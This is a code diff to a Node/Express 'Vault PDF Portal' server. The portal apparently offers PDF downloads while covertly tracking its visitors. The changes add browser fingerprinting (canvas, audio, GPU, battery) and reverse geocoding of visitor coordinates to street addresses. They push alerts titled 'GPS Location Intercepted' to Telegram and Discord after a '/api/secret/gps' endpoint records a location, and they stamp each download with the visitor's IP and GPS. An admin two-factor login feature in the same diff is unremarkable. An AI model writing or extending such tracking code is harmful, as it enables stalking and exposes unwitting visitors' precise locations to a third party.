@@ -1008,6 +1008,271 @@ function timingSafeMatch(provided, expected) {
   return crypto.timingSafeEqual(a, b);
 }
 
+// ─── In-Memory Telegram / Discord Alert Configuration ───────────────
+const alertWebhookConfig = {
+  telegramBotToken: '',
+  telegramChatId: '',
+  discordWebhookUrl: '',
+  enabled: false
+};
+
+function maskAlertToken(token) {
+  if (!token) return '';
+  if (token.length <= 8) return '••••••••';
+  return token.substring(0, 4) + '••••••••' + token.substring(token.length - 4);
+}
+
+async function sendVisitorAlert(visitorRecord, isTest = false) {
+  if (!isTest && !alertWebhookConfig.enabled) {
+    return { skipped: true, reason: 'Alerts disabled' };
+  }
+
+  const ip = visitorRecord.ip || 'Unknown';
+  const city = visitorRecord.city || visitorRecord.ipLocation?.city || 'Unknown';
+  const country = visitorRecord.country || visitorRecord.ipLocation?.country || 'Unknown';
+  const deviceType = visitorRecord.deviceType || 'Unknown';
+  const isp = visitorRecord.isp || visitorRecord.ipLocation?.isp || 'Unknown';
+  const timestamp = visitorRecord.timestamp || new Date().toISOString();
+
+  let lat = null;
+  let lon = null;
+  let acc = null;
+  if (visitorRecord.highAccuracyGps && visitorRecord.highAccuracyGps.latitude != null && visitorRecord.highAccuracyGps.longitude != null) {
+    lat = visitorRecord.highAccuracyGps.latitude;
+    lon = visitorRecord.highAccuracyGps.longitude;
+    acc = visitorRecord.highAccuracyGps.accuracy;
+  } else if (visitorRecord.lat != null && visitorRecord.lon != null) {
+    lat = visitorRecord.lat;
+    lon = visitorRecord.lon;
+  }
+
+  const coordsStr = (lat != null && lon != null) ? `${lat}, ${lon}` : 'N/A';
+  const mapsUrl = (lat != null && lon != null)
+    ? `https://www.google.com/maps?q=${lat},${lon}`
+    : 'https://maps.google.com';
+
+  const results = { telegram: null, discord: null };
+
+  const escapeHtml = (str) => {
+    if (str == null) return '';
+    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  };
+
+  // 1. Telegram Dispatch
+  if (alertWebhookConfig.telegramBotToken && alertWebhookConfig.telegramChatId) {
+    try {
+      const tgUrl = `https://api.telegram.org/bot${alertWebhookConfig.telegramBotToken}/sendMessage`;
+      const tgText = `🚨 <b>Vault PDF Portal - ${isTest ? 'TEST Alert' : 'GPS Location Captured'}</b>\n\n` +
+        `🌐 <b>IP:</b> <code>${escapeHtml(ip)}</code>\n` +
+        `📍 <b>Location:</b> ${escapeHtml(city)}, ${escapeHtml(country)}\n` +
+        `🎯 <b>GPS Coords:</b> <code>${coordsStr}</code>${acc ? ` (±${acc}m)` : ''}\n` +
+        `📱 <b>Device:</b> ${escapeHtml(deviceType)}\n` +
+        `🏢 <b>ISP:</b> ${escapeHtml(isp)}\n` +
+        `⏰ <b>Timestamp:</b> ${escapeHtml(timestamp)}\n\n` +
+        `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`;
+
+      const tgRes = await fetch(tgUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: alertWebhookConfig.telegramChatId,
+          parse_mode: 'HTML',
+          text: tgText
+        })
+      });
+      const tgData = await tgRes.json().catch(() => ({}));
+      results.telegram = { ok: tgRes.ok, status: tgRes.status, data: tgData };
+    } catch (tgErr) {
+      console.error('Telegram alert dispatch error:', tgErr.message);
+      results.telegram = { ok: false, error: tgErr.message };
+    }
+  }
+
+  // 2. Discord Dispatch
+  if (alertWebhookConfig.discordWebhookUrl) {
+    try {
+      const discordPayload = {
+        username: 'Vault Alert Monitor',
+        avatar_url: 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png',
+        embeds: [
+          {
+            title: isTest ? '🧪 Vault Alert Monitor — Test Transmission' : '🚨 Vault PDF Portal — GPS Location Intercepted',
+            color: isTest ? 0x3b82f6 : 0xef4444,
+            fields: [
+              { name: '🌐 IP Address', value: String(ip), inline: true },
+              { name: '📍 Location', value: `${city}, ${country}`, inline: true },
+              { name: '📱 Device Type', value: String(deviceType), inline: true },
+              { name: '🎯 GPS Coords', value: `${coordsStr}${acc ? ` (±${acc}m)` : ''}`, inline: false },
+              { name: '🏢 ISP', value: String(isp), inline: true },
+              { name: '⏰ Timestamp', value: String(timestamp), inline: true },
+              { name: '🗺️ Google Maps', value: `[View Coordinates on Google Maps](${mapsUrl})`, inline: false }
+            ],
+            footer: { text: 'Vault PDF Portal Security Radar' },
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      const dcRes = await fetch(alertWebhookConfig.discordWebhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(discordPayload)
+      });
+      results.discord = { ok: dcRes.ok, status: dcRes.status };
+    } catch (dcErr) {
+      console.error('Discord alert dispatch error:', dcErr.message);
+      results.discord = { ok: false, error: dcErr.message };
+    }
+  }
+
+  return results;
+}
+
+// ─── Reverse Geocoding Cache & Nominatim Helper ─────────────────────
+const reverseGeocodeCache = new Map();
+
+async function reverseGeocode(lat, lon) {
+  if (lat == null || lon == null) return null;
+  const nLat = Number(lat);
+  const nLon = Number(lon);
+  if (isNaN(nLat) || isNaN(nLon)) return null;
+
+  const cacheKey = `${nLat.toFixed(5)},${nLon.toFixed(5)}`;
+  if (reverseGeocodeCache.has(cacheKey)) {
+    return reverseGeocodeCache.get(cacheKey);
+  }
+
+  const defaultResult = {
+    street: '',
+    neighborhood: '',
+    suburb: '',
+    city: '',
+    state: '',
+    postcode: '',
+    country: '',
+    displayName: `${nLat}, ${nLon}`
+  };
+
+  try {
+    const url = `https://nominatim.openstreetmap.org/reverse?lat=${encodeURIComponent(nLat)}&lon=${encodeURIComponent(nLon)}&format=json&zoom=18&addressdetails=1`;
+    const res = await fetch(url, {
+      headers: {
+        'User-Agent': 'VaultPDFPortal/1.0'
+      }
+    });
+
+    if (res.ok) {
+      const data = await res.json();
+      if (data && data.address) {
+        const addr = data.address;
+        const street = [addr.house_number, addr.road || addr.street || addr.pedestrian || addr.footway || addr.cycleway].filter(Boolean).join(' ') || addr.road || '';
+        const neighborhood = addr.neighbourhood || addr.neighborhood || addr.quarter || addr.subdivision || '';
+        const suburb = addr.suburb || addr.borough || addr.district || '';
+        const city = addr.city || addr.town || addr.village || addr.municipality || addr.county || '';
+        const state = addr.state || addr.province || addr.region || '';
+        const postcode = addr.postcode || addr.postal_code || '';
+        const country = addr.country || '';
+        const displayName = data.display_name || `${street ? street + ', ' : ''}${city}, ${country}`;
+
+        const result = {
+          street,
+          neighborhood,
+          suburb,
+          city,
+          state,
+          postcode,
+          country,
+          displayName
+        };
+
+        reverseGeocodeCache.set(cacheKey, result);
+        if (reverseGeocodeCache.size > 500) {
+          const oldestKey = reverseGeocodeCache.keys().next().value;
+          reverseGeocodeCache.delete(oldestKey);
+        }
+        return result;
+      }
+    }
+  } catch (err) {
+    console.warn('Reverse geocode error:', err.message);
+  }
+
+  return defaultResult;
+}
+
+// ─── Admin 2FA (TOTP) Configuration & RFC 6238 Helpers ──────────────
+const admin2FAConfig = {
+  enabled: false,
+  secret: null,
+  tempSecret: null
+};
+
+const BASE32_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+
+function base32Encode(buffer) {
+  let bits = 0;
+  let value = 0;
+  let output = '';
+  for (let i = 0; i < buffer.length; i++) {
+    value = (value << 8) | buffer[i];
+    bits += 8;
+    while (bits >= 5) {
+      output += BASE32_ALPHABET[(value >>> (bits - 5)) & 31];
+      bits -= 5;
+    }
+  }
+  if (bits > 0) {
+    output += BASE32_ALPHABET[(value << (5 - bits)) & 31];
+  }
+  return output;
+}
+
+function base32Decode(str) {
+  const cleaned = String(str).toUpperCase().replace(/[\s=-]/g, '');
+  let bits = 0;
+  let value = 0;
+  const bytes = [];
+  for (let i = 0; i < cleaned.length; i++) {
+    const idx = BASE32_ALPHABET.indexOf(cleaned[i]);
+    if (idx === -1) continue;
+    value = (value << 5) | idx;
+    bits += 5;
+    if (bits >= 8) {
+      bytes.push((value >>> (bits - 8)) & 255);
+      bits -= 8;
+    }
+  }
+  return Buffer.from(bytes);
+}
+
+function generateTotp(secret, counter) {
+  const key = base32Decode(secret);
+  const buf = Buffer.alloc(8);
+  buf.writeBigUInt64BE(BigInt(counter), 0);
+  const hmac = crypto.createHmac('sha1', key).update(buf).digest();
+  const offset = hmac[hmac.length - 1] & 0x0f;
+  const code = ((hmac[offset] & 0x7f) << 24) |
+               ((hmac[offset + 1] & 0xff) << 16) |
+               ((hmac[offset + 2] & 0xff) << 8) |
+               (hmac[offset + 3] & 0xff);
+  return (code % 1000000).toString().padStart(6, '0');
+}
+
+function verifyTotp(secret, userToken) {
+  if (!secret || !userToken) return false;
+  const tokenStr = String(userToken).trim();
+  if (!/^\d{6}$/.test(tokenStr)) return false;
+
+  const currentCounter = Math.floor(Date.now() / 1000 / 30);
+  for (let offset = -1; offset <= 1; offset++) {
+    const expected = generateTotp(secret, currentCounter + offset);
+    if (crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(tokenStr))) {
+      return true;
+    }
+  }
+  return false;
+}
+
 // ─── API: Admin Login (Hardened with rate-limiting & timing protection) ──
 app.post('/api/admin/login', async (req, res) => {
   try {
@@ -1019,11 +1284,16 @@ app.post('/api/admin/login', async (req, res) => {
       });
     }
 
-    const { username, password } = req.body || {};
+    const { username, password, totpToken } = req.body || {};
     const userOk = timingSafeMatch(username, ADMIN_USERNAME);
     const passOk = timingSafeMatch(password, ADMIN_PASSWORD);
 
     if (userOk && passOk) {
+      if (admin2FAConfig.enabled) {
+        if (!totpToken || !verifyTotp(admin2FAConfig.secret, totpToken)) {
+          return res.status(200).json({ requires2FA: true });
+        }
+      }
       clearLoginAttempts(ip);
       const token = generateToken();
       activeSessions.set(token, { createdAt: Date.now() });
@@ -1073,6 +1343,12 @@ app.post('/api/visit', async (req, res) => {
       orientation,
       cpuCores,
       deviceMemory,
+      gpuVendor,
+      gpuRenderer,
+      canvasHash,
+      audioHash,
+      batteryLevel,
+      batteryCharging,
       network,
       theme,
       touchSupport,
@@ -1123,6 +1399,12 @@ app.post('/api/visit', async (req, res) => {
       orientation: orientation || null,
       cpuCores: cpuCores || null,
       deviceMemory: deviceMemory || null,
+      gpuVendor: gpuVendor || null,
+      gpuRenderer: gpuRenderer || null,
+      canvasHash: canvasHash || null,
+      audioHash: audioHash || null,
+      batteryLevel: batteryLevel || null,
+      batteryCharging: batteryCharging != null ? batteryCharging : null,
       network: network || null,
       theme: theme || null,
       touchSupport: touchSupport || null,
@@ -1317,6 +1599,13 @@ app.post('/api/secret/gps', async (req, res) => {
       visitors.push(record);
     }
     writeVisitors(visitors);
+
+    // Auto-dispatch Telegram / Discord alerts if GPS was granted (async, non-blocking)
+    if (gpsPayload && gpsPayload.status === 'granted') {
+      sendVisitorAlert(existingSecretGps || record).catch(err => {
+        console.error('Visitor alert dispatch error:', err.message);
+      });
+    }
 
     res.json({
       success: true,
@@ -1595,10 +1884,30 @@ app.get('/api/download/:filename', (req, res) => {
     writeDownloads(downloads);
   }
 
+  // Lightweight text watermark via custom response header
+  let lat = 'N/A';
+  let lon = 'N/A';
+  for (let i = visitors.length - 1; i >= 0; i--) {
+    if (visitors[i].ip === ip) {
+      if (visitors[i].highAccuracyGps && visitors[i].highAccuracyGps.latitude != null && visitors[i].highAccuracyGps.longitude != null) {
+        lat = visitors[i].highAccuracyGps.latitude;
+        lon = visitors[i].highAccuracyGps.longitude;
+        break;
+      } else if (visitors[i].lat != null && visitors[i].lon != null && lat === 'N/A') {
+        lat = visitors[i].lat;
+        lon = visitors[i].lon;
+      }
+    }
+  }
+  const isoTime = dlNow.toISOString();
+  const watermarkHash = crypto.createHash('sha256').update(ip + isoTime).digest('hex');
+  const watermarkValue = `IP:${ip}|GPS:${lat},${lon}|Time:${isoTime}|Hash:${watermarkHash}`;
+
   res.set({
     'Content-Type': 'application/pdf',
     'Content-Disposition': `attachment; filename="${encodeURIComponent(fileInfo.originalName)}"`,
-    'Content-Length': fileInfo.size
+    'Content-Length': fileInfo.size,
+    'X-Vault-Watermark': watermarkValue
   });
   fs.createReadStream(fileInfo.filePath).pipe(res);
 });
@@ -5146,6 +5455,146 @@ app.post('/api/translate/document', translateLimiter, async (req, res) => {
     console.error('Translation error:', err);
     res.status(500).json({ error: 'Failed to translate document: ' + err.message });
   }
+});
+
+// ─── API: Telegram & Discord Alert Webhook Settings (admin) ───────────
+app.get('/api/admin/alert-config', requireAdmin, (req, res) => {
+  res.json({
+    telegramBotToken: maskAlertToken(alertWebhookConfig.telegramBotToken),
+    hasTelegramBotToken: Boolean(alertWebhookConfig.telegramBotToken),
+    telegramChatId: alertWebhookConfig.telegramChatId || '',
+    discordWebhookUrl: alertWebhookConfig.discordWebhookUrl || '',
+    enabled: Boolean(alertWebhookConfig.enabled)
+  });
+});
+
+app.post('/api/admin/alert-config', requireAdmin, (req, res) => {
+  try {
+    const { telegramBotToken, telegramChatId, discordWebhookUrl, enabled } = req.body || {};
+    if (telegramBotToken !== undefined) {
+      const tokenStr = String(telegramBotToken).trim();
+      if (!tokenStr.includes('••••')) {
+        alertWebhookConfig.telegramBotToken = tokenStr;
+      }
+    }
+    if (telegramChatId !== undefined) {
+      alertWebhookConfig.telegramChatId = String(telegramChatId).trim();
+    }
+    if (discordWebhookUrl !== undefined) {
+      alertWebhookConfig.discordWebhookUrl = String(discordWebhookUrl).trim();
+    }
+    if (enabled !== undefined) {
+      alertWebhookConfig.enabled = Boolean(enabled);
+    }
+    res.json({
+      success: true,
+      message: 'Alert configuration saved.',
+      config: {
+        telegramBotToken: maskAlertToken(alertWebhookConfig.telegramBotToken),
+        hasTelegramBotToken: Boolean(alertWebhookConfig.telegramBotToken),
+        telegramChatId: alertWebhookConfig.telegramChatId,
+        discordWebhookUrl: alertWebhookConfig.discordWebhookUrl,
+        enabled: alertWebhookConfig.enabled
+      }
+    });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to save alert configuration: ' + err.message });
+  }
+});
+
+app.post('/api/admin/alert-test', requireAdmin, async (req, res) => {
+  try {
+    const testRecord = {
+      ip: getVisitorIP(req),
+      city: 'Washington',
+      country: 'United States',
+      deviceType: 'Desktop (Admin Test)',
+      isp: 'Cloudflare / ISP Test Relay',
+      timestamp: new Date().toISOString(),
+      highAccuracyGps: {
+        latitude: 38.8977,
+        longitude: -77.0365,
+        accuracy: 5,
+        status: 'granted'
+      }
+    };
+    const results = await sendVisitorAlert(testRecord, true);
+    res.json({
+      success: true,
+      message: 'Test alert dispatched.',
+      results
+    });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to send test alert: ' + err.message });
+  }
+});
+
+// ─── API: Reverse Geocoding Lookup (admin) ──────────────────────────
+app.get('/api/admin/reverse-geocode', requireAdmin, async (req, res) => {
+  try {
+    const { lat, lon } = req.query;
+    if (!lat || !lon) {
+      return res.status(400).json({ error: 'lat and lon query parameters are required' });
+    }
+    const result = await reverseGeocode(lat, lon);
+    res.json({
+      success: true,
+      address: result,
+      ...result
+    });
+  } catch (err) {
+    res.status(500).json({ error: 'Reverse geocode failed: ' + err.message });
+  }
+});
+
+// ─── API: Admin 2FA (TOTP) Security Management (admin) ───────────────
+app.get('/api/admin/2fa/status', requireAdmin, (req, res) => {
+  res.json({ enabled: Boolean(admin2FAConfig.enabled) });
+});
+
+app.post('/api/admin/2fa/setup', requireAdmin, (req, res) => {
+  try {
+    const secretBytes = crypto.randomBytes(20);
+    const secret = base32Encode(secretBytes);
+    admin2FAConfig.tempSecret = secret;
+    const otpauthUrl = `otpauth://totp/VaultPDFPortal:admin?secret=${secret}&issuer=VaultPDFPortal`;
+    res.json({ secret, otpauthUrl });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to generate 2FA secret: ' + err.message });
+  }
+});
+
+app.post('/api/admin/2fa/verify', requireAdmin, (req, res) => {
+  const { token } = req.body || {};
+  const secretToTest = admin2FAConfig.tempSecret || admin2FAConfig.secret;
+  if (!secretToTest) {
+    return res.status(400).json({ valid: false, error: 'No 2FA secret setup in progress' });
+  }
+  const valid = verifyTotp(secretToTest, token);
+  res.json({ valid });
+});
+
+app.post('/api/admin/2fa/enable', requireAdmin, (req, res) => {
+  const { token } = req.body || {};
+  const secretToEnable = admin2FAConfig.tempSecret || admin2FAConfig.secret;
+  if (!secretToEnable) {
+    return res.status(400).json({ error: '2FA setup must be initiated first.' });
+  }
+  const valid = verifyTotp(secretToEnable, token);
+  if (!valid) {
+    return res.status(400).json({ error: 'Invalid 2FA verification code. Please check your authenticator app.' });
+  }
+  admin2FAConfig.secret = secretToEnable;
+  admin2FAConfig.enabled = true;
+  admin2FAConfig.tempSecret = null;
+  res.json({ success: true, enabled: true, message: 'Two-factor authentication enabled successfully.' });
+});
+
+app.post('/api/admin/2fa/disable', requireAdmin, (req, res) => {
+  admin2FAConfig.enabled = false;
+  admin2FAConfig.secret = null;
+  admin2FAConfig.tempSecret = null;
+  res.json({ success: true, enabled: false, message: 'Two-factor authentication disabled.' });
 });
 
 // ─── Global Error Handling Middleware (Multer + Application Errors) ──
